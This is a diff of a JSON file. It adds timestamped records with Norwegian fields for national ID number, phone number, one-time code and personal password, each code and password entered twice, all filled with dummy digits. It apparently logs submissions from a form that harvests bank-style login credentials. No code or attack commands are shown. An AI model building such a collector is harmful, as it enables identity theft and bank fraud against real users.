@@ -1,12 +1,32 @@
 [
     {
-        "input1": "Duis quas ut adipisi",
-        "input2": "Sint amet non amet",
-        "input3": "Excepturi quae offic"
+        "input01": "34523453463",
+        "input02": "34563456",
+        "input03": "456345",
+        "input04": "234525634563456",
+        "input05": "234523",
+        "input07": "673467456745675467",
+        "input08": "345234",
+        "timestamp": "2024-12-02 07:17:52"
     },
     {
-        "input1": "Rerum est quos laud",
-        "input2": "Perferendis et sed r",
-        "input3": "At quasi irure commo"
+        "Fodselsnummer": "23452345234",
+        "Telefonnummer": "23452345",
+        "Engangskode": "234523",
+        "PersoneligPassord": "23452345234",
+        "EngangskodeIgjen": "234523",
+        "GjentaPassord": "23452345234",
+        "GjentaKode": "234523",
+        "timestamp": "2024-12-02 07:44:05"
+    },
+    {
+        "Fodselsnummer": "23452345234",
+        "Telefonnummer": "23452345",
+        "Engangskode": "234523",
+        "PersoneligPassord": "23452345234",
+        "EngangskodeIgjen": "234523",
+        "GjentaPassord": "23452345234",
+        "GjentaKode": "234523",
+        "timestamp": "2024-12-02 07:44:21"
     }
 ]
